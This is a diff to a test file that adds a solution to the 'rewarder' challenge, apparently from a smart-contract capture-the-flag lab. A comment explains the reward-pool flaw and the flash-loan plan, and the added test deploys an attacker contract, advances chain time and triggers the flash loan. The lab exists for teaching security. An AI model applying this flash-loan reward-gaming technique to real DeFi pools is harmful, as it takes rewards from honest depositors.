@@ -64,8 +64,25 @@ describe('[Challenge] The rewarder', function () {
         ).to.be.eq('2');
     });
 
+    /**
+     * Goal: claim most rewards then others
+     * Bug: The pool is not checking for how long we have deposited our tokens to distribute a fair amount of token.
+     * Solution: Wait for a new round(5 days), flashloan a huge money, have them deposited in the reward pool, then withdraw, repay the money, claim rewards.
+     */
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const factory = await ethers.getContractFactory("RewardEvilReceiver", attacker);
+        this.evilReceiver = await factory.deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        )
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        await this.evilReceiver.connect(attacker).flashLoan();
+
     });
 
     after(async function () {
